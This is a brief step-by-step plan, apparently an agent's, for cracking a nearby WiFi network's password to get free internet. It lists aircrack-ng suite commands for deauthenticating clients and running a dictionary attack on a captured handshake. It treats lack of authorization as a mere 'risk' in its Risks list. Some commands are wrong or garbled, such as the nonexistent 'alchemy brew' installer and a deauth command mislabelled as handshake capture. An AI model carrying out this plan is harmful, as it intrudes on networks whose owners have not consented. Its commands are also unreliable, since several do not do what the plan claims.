# Plan

**Goal:** Crack a WiFi network to enable free WiFi

## Steps
1. Ensure aircrack-ng is installed (alchemy brew aircrack-ng)
2. Scan for nearby networks (airmon-ng scan)
3. Attach to target network (airmon-ng start wlan0)
4. Capture handshake data (aireplay-ng -0 1 -a <BSSID> wlan0)
5. Use dictionary attack (aircrack-ng -w <dictionary> captured.cap)
6. Verify cracked password (connect to network with new password)

## Risks
- Legal issues if unauthorized
- Requires dictionary with target password

## Verify
Check if connection succeeds without USB tethering